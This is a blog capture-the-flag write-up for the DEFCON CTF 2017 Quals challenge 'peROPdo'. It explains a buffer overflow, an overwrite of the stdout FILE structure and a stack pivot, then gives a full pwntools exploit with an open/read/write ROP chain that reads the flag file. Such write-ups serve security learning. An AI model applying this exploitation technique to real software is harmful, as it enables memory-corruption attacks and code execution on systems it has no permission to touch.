<!doctype html>



  


<html class="theme-next pisces use-motion" lang="en">
<head>
  <meta charset="UTF-8"/>
<meta http-equiv="X-UA-Compatible" content="IE=edge" />
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>






<meta http-equiv="Cache-Control" content="no-transform" />
<meta http-equiv="Cache-Control" content="no-siteapp" />















  
  
  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />




  
  
  
  

  
    
    
  

  

  

  

  

  
    
    
    <link href="//fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
  






<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />

<link href="/css/main.css?v=5.1.1" rel="stylesheet" type="text/css" />


  <meta name="keywords" content="CTF,Pwnable,Python,C,BOF,DEFCON,ROP,file_stream_pointer_overflow," />





  <link rel="alternate" href="/atom.xml" title="Hacking Tube 2.0" type="application/atom+xml" />




  <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=5.1.1" />






<meta name="description" content="Category: Potent Pwnables 32 bit ELF, static link, stripped, NX enabled, No PIE &amp;amp; canary.">
<meta name="keywords" content="CTF,Pwnable,Python,C,BOF,DEFCON,ROP,file_stream_pointer_overflow">
<meta property="og:type" content="article">
<meta property="og:title" content="DEFCON CTF 2017 Quals -- peROPdo">
<meta property="og:url" content="https://bruce30262.github.io/2017/05/02/2017-05-02-1784510/index.html">
<meta property="og:site_name" content="Hacking Tube 2.0">
<meta property="og:description" content="Category: Potent Pwnables 32 bit ELF, static link, stripped, NX enabled, No PIE &amp;amp; canary.">
<meta property="og:locale" content="en">
<meta property="og:updated_time" content="2018-01-03T15:08:05.599Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="DEFCON CTF 2017 Quals -- peROPdo">
<meta name="twitter:description" content="Category: Potent Pwnables 32 bit ELF, static link, stripped, NX enabled, No PIE &amp;amp; canary.">



<script type="text/javascript" id="hexo.configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    root: '/',
    scheme: 'Pisces',
    sidebar: {"position":"left","display":"post","offset":12,"offset_float":0,"b2t":false,"scrollpercent":false},
    fancybox: true,
    motion: true,
    duoshuo: {
      userId: '0',
      author: 'Author'
    },
    algolia: {
      applicationID: '',
      apiKey: '',
      indexName: '',
      hits: {"per_page":10},
      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
    }
  };
</script>



  <link rel="canonical" href="https://bruce30262.github.io/2017/05/02/2017-05-02-1784510/"/>





  <title>DEFCON CTF 2017 Quals -- peROPdo | Hacking Tube 2.0</title>
</head>

<body itemscope itemtype="http://schema.org/WebPage" lang="en">

  




<script>
  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
            (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
          m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
  })(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
  ga('create', 'UA-100090256-1', 'auto');
  ga('send', 'pageview');
</script>












  
  
    
  

  <div class="container sidebar-position-left page-post-detail ">
    <div class="headband"></div>

    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-wrapper">
  <div class="site-meta ">
    

    <div class="custom-logo-site-title">
      <a href="/"  class="brand" rel="start">
        <span class="logo-line-before"><i></i></span>
        <span class="site-title">Hacking Tube 2.0</span>
        <span class="logo-line-after"><i></i></span>
      </a>
    </div>
      
        <p class="site-subtitle">Security and stuff.</p>
      
  </div>

  <div class="site-nav-toggle">
    <button>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
    </button>
  </div>
</div>

<nav class="site-nav">
  

  
    <ul id="menu" class="menu">
      
        
        <li class="menu-item menu-item-home">
          <a href="/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
            
            Home
          </a>
        </li>
      
        
        <li class="menu-item menu-item-archives">
          <a href="/archives" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
            
            Archives
          </a>
        </li>
      
        
        <li class="menu-item menu-item-categories">
          <a href="/categories" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
            
            Categories
          </a>
        </li>
      
        
        <li class="menu-item menu-item-tags">
          <a href="/tags" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
            
            Tags
          </a>
        </li>
      
        
        <li class="menu-item menu-item-about">
          <a href="/about" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
            
            About
          </a>
        </li>
      

      
    </ul>
  

  
</nav>



 </div>
    </header>

    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
          <div id="content" class="content">
            

  <div id="posts" class="posts-expand">
    

  

  
  
  

  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
    <link itemprop="mainEntityOfPage" href="https://bruce30262.github.io/2017/05/02/2017-05-02-1784510/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Bruce Chen">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="https://s.gravatar.com/avatar/ff4140457527a5c7d307793a9ec905e0?s=80">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Hacking Tube 2.0">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">DEFCON CTF 2017 Quals -- peROPdo</h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2017-05-02T14:58:00+08:00">
                2017-05-02
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">In</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/write-ups/" itemprop="url" rel="index">
                    <span itemprop="name">write-ups</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
              <span class="post-comments-count">
                <span class="post-meta-divider">|</span>
                <span class="post-meta-item-icon">
                  <i class="fa fa-comment-o"></i>
                </span>
                <a href="/2017/05/02/2017-05-02-1784510/#comments" itemprop="discussionUrl">
                  <span class="post-comments-count disqus-comment-count"
                        data-disqus-identifier="2017/05/02/2017-05-02-1784510/" itemprop="commentCount"></span>
                </a>
              </span>
            
          

          
          

          
            <span class="post-meta-divider">|</span>
            <span class="page-pv"><i class="fa fa-eye"></i>
            <span class="busuanzi-value" id="busuanzi_value_page_pv" ></span>views
            </span>
          

          

          

        </div>
      </header>
    

    <div class="post-body" itemprop="articleBody">

      
      

      
        <p><strong>Category:</strong> Potent Pwnables</p>
<p>32 bit ELF, static link, stripped, NX enabled, No PIE &amp; canary.  </p>
<a id="more"></a>
<p>The program is a “rolling dice” program. First we input our name, then the program will ask us how many dice would we like to roll. After we input a number, the program will start generating some random data, then store them on the stack memory. The program will then print out <code>data[i] % 6 + 1</code>, which represent the numbers we roll in this round. </p>
<p>There’re two vulnerabilities in the program. First it use <code>scanf(&quot;%s&quot;, name)</code> to read our name, which lead to buffer overflow in the <code>name</code> buffer. Then, if we input a number that is larger than <strong>23</strong>, the data that program generated will overflow the <code>data[i]</code> buffer and <strong>thus overwrite the return address</strong> ( it will be a random data though ).  </p>
<p>Since the binary was stripped, I wasn’t sure which algorithm the program used for randomizing, the only thing I knew is that the algorithm will use our name to generate the random data. At that moment, I thought it was just some self-implement function ( which is <strong>NOT</strong> correct, we’ll get into that later).  </p>
<p>And so I thought “Hmmm, maybe I could use some symbolic execution tool to calculate the address I want to return, and do the ROP attack”. <strong>This was such a huge mistake</strong>, since I’m not familiar with any of the symbolic execution tools – <a href="http://angr.io/" target="_blank" rel="noopener">angr</a>, <a href="https://github.com/JonathanSalwan/Triton" target="_blank" rel="noopener">Triton</a>, not to mention the fresh out <a href="https://github.com/trailofbits/manticore" target="_blank" rel="noopener">manticore</a>. Even worse, all of the tool failed to calculate the address – Triton and manticore couldn’t even execute the program, it just crashed :(  </p>
<p>After wasting lots of time with those symbolic execution tools, I decided to try something different – the first vulnerability: overflowing the <code>name</code> buffer. And the result was encouraging – since I found that I could hijack the control flow by using the <code>call reg</code> and the <code>call [reg+offset]</code> gadget ( we can control the content of several registers ). It seems that there’re some <code>FILE*</code> pointer behind the <code>name</code> buffer, so we can exploit the service by <a href="https://outflux.net/blog/archives/2011/12/22/abusing-the-file-structure/" target="_blank" rel="noopener">abusing the FILE structure</a> ( we can’t control the function parameters though). </p>
<p>Here I chose to use the second gadget ( <code>call [reg+offset]</code> ), since when the program execute to that line of code, its second parameter will be the <code>FILE*</code> pointer of <code>stdout</code>. I control the <code>eip</code> and jump to the middle of the main function:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">mov     dword ptr [esp+4], offset name</span><br><span class="line">mov     dword ptr [esp], (offset aSSSS+8) ; &quot;%s&quot; &lt;--- I jump to here</span><br><span class="line">call    scanf</span><br><span class="line">mov     eax, ds:name</span><br><span class="line">mov     [esp], eax</span><br><span class="line">call    sub_0804baf0</span><br><span class="line">mov     dword ptr [esp], offset name</span><br><span class="line">call    do_main</span><br></pre></td></tr></table></figure></p>
<p>This will make the program store the <code>%s</code> string to the first parameter, then call the <code>scanf</code> function, making the program calling <code>scanf(&quot;%s&quot;, stdout)</code> – and thus we can control the content of <code>stdout</code> !</p>
<p>By crafting <code>stdout</code>, we can actually hijack the control flow, while having the first parameter controlled. This allowed us to do some advanced ROP attack. Here’s what I did after I controlled the <code>eip</code>:  </p>
<ol>
<li>Jump to <code>xchg esp, eax</code> gadget, migrate the stack to <code>stdout</code> (which now controlled by us)  </li>
<li>Use <code>add esp, offset</code> to skip the uncontrollable member data in <code>stdout</code>  </li>
<li>Since it’s a static linked binary, it’s easy for us to find some gadgets and do the <strong>open/read/write</strong> syscall, making the service print out the flag of the challenge. (The <strong>execve</strong> syscall seems to be filtered out in this challenge)  </li>
</ol>
<p>Final exploit:<br><figure class="highlight python"><figcaption><span>exp_peropdo.py </span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">HOST = <span class="string">"peropdo_bb53b90b35dba86353af36d3c6862621.quals.shallweplayaga.me"</span></span><br><span class="line">PORT = <span class="number">80</span></span><br><span class="line">ELF_PATH = <span class="string">"./peropdo"</span></span><br><span class="line"></span><br><span class="line">context.binary = ELF_PATH</span><br><span class="line">context.log_level = <span class="string">'INFO'</span> <span class="comment"># ['CRITICAL', 'DEBUG', 'ERROR', 'INFO', 'NOTSET', 'WARN', 'WARNING']</span></span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>, <span class="string">'splitw'</span>] <span class="comment"># for gdb.attach</span></span><br><span class="line"></span><br><span class="line">elf = context.binary <span class="comment"># context.binary is an ELF object</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line"></span><br><span class="line">    r = remote(HOST, PORT)</span><br><span class="line">    <span class="comment">#r = process(ELF_PATH)</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">#gdb.attach(r, gdbscript=open("./ggg", "r"))</span></span><br><span class="line">    func = <span class="number">0x0806d7aa</span> <span class="comment"># avoid crash</span></span><br><span class="line">    scanf = <span class="number">0x08048b2a</span></span><br><span class="line">    name = p32(scanf) + p32(func) + <span class="string">"\x42"</span>*<span class="number">972</span> + p32(<span class="number">0x80ecdf4</span>) + <span class="string">'\x00'</span>*<span class="number">92</span>  + p32(<span class="number">0x80ecdf8</span>) </span><br><span class="line">    r.sendlineafter(<span class="string">"name?"</span>, name)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Later the program will call scanf("%s", stdout);</span></span><br><span class="line">    <span class="comment"># now we can overwrite the whole stdout FILE structure</span></span><br><span class="line"></span><br><span class="line">    stream = p32(<span class="number">0x08079824</span>) <span class="comment"># second gadget: add esp, 0x84....</span></span><br><span class="line">    stream += <span class="string">"/home/peropdo/flag\x00"</span> <span class="comment"># flag path</span></span><br><span class="line">    stream = stream.ljust(<span class="number">0x1c</span>, <span class="string">'\0'</span>)</span><br><span class="line">    stream += p32(<span class="number">0x804b45c</span>) <span class="comment"># eip, first gadget: xchg esp, eax ; ret</span></span><br><span class="line">    stream = stream.ljust(<span class="number">0x48</span>, <span class="string">'\0'</span>)</span><br><span class="line">    stream += p32(<span class="number">0x080ED3E8</span>) <span class="comment"># pointer to null</span></span><br><span class="line">    stream = stream.ljust(<span class="number">0x90</span>, <span class="string">'\0'</span>)</span><br><span class="line">    stream += p32(<span class="number">0x807982b</span>) <span class="comment"># third gadget: pop; ret</span></span><br><span class="line">    stream += p32(<span class="number">0x80eb2a0</span>) <span class="comment"># fake jump table</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 0x08074f2e : mov eax, 5 ; pop ebx ; pop esi ; pop edi ; pop ebp ; ret </span></span><br><span class="line">    <span class="comment"># 0x08079465 : mov ebx, eax ; mov eax, ebx ; pop ebx ; pop esi ; pop edi ; pop ebp ; ret</span></span><br><span class="line">    pop_ebx = <span class="number">0x806f322</span>  <span class="comment"># pop ebx;ret</span></span><br><span class="line">    pop_eax = <span class="number">0x80e3525</span>  <span class="comment"># pop eax;ret</span></span><br><span class="line">    pop_ecx = <span class="number">0x080e5ee1</span> <span class="comment"># pop ecx ; ret </span></span><br><span class="line">    pop_edx = <span class="number">0x0806f2fa</span> <span class="comment"># pop edx ; ret</span></span><br><span class="line">    int80 = <span class="number">0x806fae0</span>    <span class="comment"># int 0x80 ; ret </span></span><br><span class="line">    buf = <span class="number">0x80ed000</span><span class="number">-0x100</span></span><br><span class="line">    rop = flat(</span><br><span class="line">                pop_ecx,</span><br><span class="line">                <span class="number">0</span>,</span><br><span class="line">                pop_edx, </span><br><span class="line">                <span class="number">0</span>,</span><br><span class="line">                <span class="number">0x08074f2e</span>, <span class="comment"># mov eax = 5 (open), pop ebx...</span></span><br><span class="line">                <span class="number">0x80eb2a4</span>, <span class="comment"># ptr to flag path</span></span><br><span class="line">                [<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>],</span><br><span class="line">                int80,              </span><br><span class="line">                pop_eax,</span><br><span class="line">                <span class="number">3</span>, <span class="comment"># read</span></span><br><span class="line">                pop_ebx,</span><br><span class="line">                <span class="number">3</span>, <span class="comment">#fd</span></span><br><span class="line">                pop_ecx,</span><br><span class="line">                buf,</span><br><span class="line">                pop_edx,</span><br><span class="line">                <span class="number">0x100</span>,</span><br><span class="line">                int80,</span><br><span class="line">                pop_ebx,</span><br><span class="line">                <span class="number">1</span>, <span class="comment"># fd,</span></span><br><span class="line">                pop_eax,</span><br><span class="line">                <span class="number">4</span>, <span class="comment"># write</span></span><br><span class="line">                int80</span><br><span class="line">              )</span><br><span class="line"></span><br><span class="line">    r.sendline(stream + rop)</span><br><span class="line">    r.interactive()</span><br></pre></td></tr></table></figure></p>
<p>flag: <code>Thanks to Kenshoto for the inspiration! 5fbb34920c457b2e0855a174b8de3ebc</code>  </p>
<p>Later did I know (thanks to teammate <a href="https://poning.me/" target="_blank" rel="noopener">Isaac</a>) that there’s a thing call <a href="https://www.hex-rays.com/products/ida/tech/flirt/index.shtml" target="_blank" rel="noopener">FLIRT</a> in IDA Pro, which can help the user identify the function call in libc. All we need to do is download a FLIRT signature database from github ( <a href="https://github.com/push0ebp/sig-database" target="_blank" rel="noopener">here’s</a> the DB I used for this challenge ), and use <strong>FILE –&gt; Load File –&gt; FLIRT signature file</strong> to load the database. IDA will then identify the function name, making the reverse engineering less painful. By using this technique, we’ll be able to identify some libc function, even the location of <code>stdout</code>.  </p>
<p>And that’s when I found that the “self-implement random” function is actually just <code>srand()</code> &amp; <code>rand()</code> in libc. According to <a href="https://github.com/mehQQ" target="_blank" rel="noopener">meh</a> from HITCON, you can just brute-force the desired return address. Moreover, because the <code>name</code> buffer address is right under the return address, so you can just use <code>pop esp; ret</code> to migrate the stack into <code>name</code> buffer, and do the ROP attack. Guess I still got a lot of shit to learn :/</p>

      
    </div>

    <div>
      
        

      
    </div>

    <div>
      
        

      
    </div>

    <div>
      
        

      
    </div>

    <footer class="post-footer">
      
        <div class="post-tags">
          
            <a href="/tags/CTF/" rel="tag"># CTF</a>
          
            <a href="/tags/Pwnable/" rel="tag"># Pwnable</a>
          
            <a href="/tags/Python/" rel="tag"># Python</a>
          
            <a href="/tags/C/" rel="tag"># C</a>
          
            <a href="/tags/BOF/" rel="tag"># BOF</a>
          
            <a href="/tags/DEFCON/" rel="tag"># DEFCON</a>
          
            <a href="/tags/ROP/" rel="tag"># ROP</a>
          
            <a href="/tags/file-stream-pointer-overflow/" rel="tag"># file_stream_pointer_overflow</a>
          
        </div>
      

      
        
      

      
        <div class="post-nav">
          <div class="post-nav-next post-nav-item">
            
              <a href="/2016/12/30/2016-12-30-33c3-ctf-2016-rec/" rel="next" title="33C3 CTF 2016 -- rec">
                <i class="fa fa-chevron-left"></i> 33C3 CTF 2016 -- rec
              </a>
            
          </div>

          <span class="post-nav-divider"></span>

          <div class="post-nav-prev post-nav-item">
            
              <a href="/2017/05/02/2017-05-02-1784522/" rel="prev" title="DEFCON CTF 2017 Quals -- badint">
                DEFCON CTF 2017 Quals -- badint <i class="fa fa-chevron-right"></i>
              </a>
            
          </div>
        </div>
      

      
      
    </footer>
  </article>



    <div class="post-spread">
      
        <!-- Go to www.addthis.com/dashboard to customize your tools -->
<div class="addthis_inline_share_toolbox">
  <script type = "text/javascript" src = "//s7.addthis.com/js/300/addthis_widget.js#pubid=ra-592d8051fa91b8b6" async = "async" ></script>
</div>

      
    </div>
  </div>


          </div>
          


          
  <div class="comments" id="comments">
    
      <div id="disqus_thread">
        <noscript>
          Please enable JavaScript to view the
          <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a>
        </noscript>
      </div>
    
  </div>


        </div>
        
          
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    <div class="sidebar-inner">

      

      

      <section class="site-overview sidebar-panel sidebar-panel-active">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
          <img class="site-author-image" itemprop="image"
               src="https://s.gravatar.com/avatar/ff4140457527a5c7d307793a9ec905e0?s=80"
               alt="Bruce Chen" />
          <p class="site-author-name" itemprop="name">Bruce Chen</p>
           
              <p class="site-description motion-element" itemprop="description">Security researcher / CTFer / Pwner</p>
          
        </div>
        <nav class="site-state motion-element">

          
            <div class="site-state-item site-state-posts">
              <a href="/archives">
                <span class="site-state-item-count">50</span>
                <span class="site-state-item-name">posts</span>
              </a>
            </div>
          

          
            
            
            <div class="site-state-item site-state-categories">
              <a href="/categories/index.html">
                <span class="site-state-item-count">2</span>
                <span class="site-state-item-name">categories</span>
              </a>
            </div>
          

          
            
            
            <div class="site-state-item site-state-tags">
              <a href="/tags/index.html">
                <span class="site-state-item-count">65</span>
                <span class="site-state-item-name">tags</span>
              </a>
            </div>
          

        </nav>

        
          <div class="feed-link motion-element">
            <a href="/atom.xml" rel="alternate">
              <i class="fa fa-rss"></i>
              RSS
            </a>
          </div>
        

        <div class="links-of-author motion-element">
          
            
              <span class="links-of-author-item">
                <a href="https://github.com/bruce30262" target="_blank" title="Github">
                  
                    <i class="fa fa-fw fa-github"></i>
                  
                  Github
                </a>
              </span>
            
              <span class="links-of-author-item">
                <a href="https://twitter.com/bruce30262" target="_blank" title="Twitter">
                  
                    <i class="fa fa-fw fa-twitter"></i>
                  
                  Twitter
                </a>
              </span>
            
              <span class="links-of-author-item">
                <a href="https://www.facebook.com/bruce.chen.102" target="_blank" title="Facebook">
                  
                    <i class="fa fa-fw fa-facebook"></i>
                  
                  Facebook
                </a>
              </span>
            
          
        </div>

        
        
          <div class="cc-license motion-element" itemprop="license">
            <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" class="cc-opacity" target="_blank">
              <img src="/images/cc-by-nc-sa.svg" alt="Creative Commons" />
            </a>
          </div>
        

        
        

        


      </section>

      

      

    </div>
  </aside>


        
      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        <div class="copyright" >
  
  &copy;  2017 - 
  <span itemprop="copyrightYear">2018</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">Bruce Chen</span>
</div>


<div class="powered-by">
  Powered by <a class="theme-link" href="https://hexo.io">Hexo</a>
</div>

<div class="theme-info">
  Theme -
  <a class="theme-link" href="https://github.com/iissnan/hexo-theme-next">
    NexT.Pisces
  </a>
</div>


        
<div class="busuanzi-count">
  <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>

  
    <span class="site-uv">
      <i class="fa fa-user"></i>
      <span class="busuanzi-value" id="busuanzi_value_site_uv"></span>
      Total visitors
    </span>
  

  
    <span class="site-pv">
      <i class="fa fa-eye"></i>
      <span class="busuanzi-value" id="busuanzi_value_site_pv"></span>
      Total views
    </span>
  
</div>


        
      </div>
    </footer>

    
      <div class="back-to-top">
        <i class="fa fa-arrow-up"></i>
        
      </div>
    

  </div>

  

<script type="text/javascript">
  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
    window.Promise = null;
  }
</script>









  












  
  <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>

  
  <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>

  
  <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>

  
  <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>

  
  <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>

  
  <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>


  


  <script type="text/javascript" src="/js/src/utils.js?v=5.1.1"></script>

  <script type="text/javascript" src="/js/src/motion.js?v=5.1.1"></script>



  
  


  <script type="text/javascript" src="/js/src/affix.js?v=5.1.1"></script>

  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.1"></script>



  
  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.1"></script>
<script type="text/javascript" src="/js/src/post-details.js?v=5.1.1"></script>



  


  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.1"></script>



  


  

    
      <script id="dsq-count-scr" src="https://bruce30262logdown.disqus.com/count.js" async></script>
    

    
      <script type="text/javascript">
        var disqus_config = function () {
          this.page.url = 'https://bruce30262.github.io/2017/05/02/2017-05-02-1784510/';
          this.page.identifier = '2017/05/02/2017-05-02-1784510/';
          this.page.title = 'DEFCON CTF 2017 Quals -- peROPdo';
        };
        var d = document, s = d.createElement('script');
        s.src = 'https://bruce30262logdown.disqus.com/embed.js';
        s.setAttribute('data-timestamp', '' + +new Date());
        (d.head || d.body).appendChild(s);
      </script>
    

  













  





  

  

  

  

  

</body>
</html>
